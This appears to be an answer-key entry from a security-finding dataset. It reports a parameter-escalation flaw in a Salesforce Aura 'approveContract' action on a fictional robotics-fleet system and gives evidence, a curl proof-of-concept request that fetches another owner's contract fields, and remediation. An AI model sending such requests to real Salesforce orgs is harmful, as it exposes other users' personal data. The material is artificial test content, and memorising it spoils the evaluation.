# Expected Response

## System
- **Domain:** Industrial IoT / Robotics Fleet (Salesforce-Integrated)
- **System:** ManuControl Robotics Fleet (Salesforce-Integrated)
- **Example ID:** SF-0007

## Priority Findings

### Finding 1: Industrial IoT Salesforce — Parameter Escalation via Aura approveContract Exposes Cross-Ownership Contract Data (Pattern 10.2)
**Severity:** High
**Category:** Single-User / Parameter Escalation / Own Session Scope Extension (Salesforce Aura)

**Summary:**
Per §4.0 (RISK-SF-007/RISK-SF-008): The `ContractController` Apex class is declared `without sharing`, meaning Salesforce sharing rules are not enforced. The SOQL query is missing an ownership check. Per §5.0 (Pattern 10.2 — parameter escalation/own session scope extension): the Aura `approveContract` action accepts a client-supplied `contractId`, allowing a user to escalate their session scope to robotics fleet contracts belonging to other users. An attacker submitted `c.ContractController.approveContract` with `contractId: "00164BE"` (belonging to `OwnerId: "005VICTIM"`) and received `SensitiveData__c: "SSN: 000-21-9098"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"`. In Industrial IoT, unauthorized contract approval enables equipment supply chain fraud.

**Evidence from HAR:**
- Request: `POST https://145764be.lightning.force.com/aura`
- Aura action descriptor: `c.ContractController.approveContract`
- `aura.token`: `undefined`
- Params: `contractId: "00164BE"`, `fields: ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]`
- Response `SUCCESS`: `Id: "00164BE"`, `Name: "Victim Contract Record"`, `OwnerId: "005VICTIM"`, `InternalNotes__c: "CONFIDENTIAL: internal review notes"`, `SensitiveData__c: "SSN: 000-21-9098"`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-SF-007 | ContractController declared `without sharing` |
| context.txt §4.0 | RISK-SF-008 | SOQL missing ownership check |
| context.txt §5.0 | Pattern 10.2 | Parameter escalation via contractId session scope extension |
| HAR request | params.contractId | 00164BE — victim contract ID |
| HAR response | SensitiveData__c | SSN: 000-21-9098 (PII) |
| HAR response | OwnerId | 005VICTIM (scope escalation confirmed) |

## Steps to Reproduce

### Step 1 — Aura contractId parameter escalation industrial IoT (HAR)
```bash
curl -s -X POST 'https://145764be.lightning.force.com/aura' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN","params":{"contractId":"00164BE","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```
**Vulnerable:** Returns victim contract record including `SSN: 000-21-9098`. **Secure:** FORBIDDEN — `with sharing`; SOQL restricted to caller ownership.

## Remediation
1. Declare `ContractController` as `with sharing`.
2. Add `AND OwnerId = :UserInfo.getUserId()` to the SOQL WHERE clause.
3. Validate `aura.token`; server-side field allowlist.
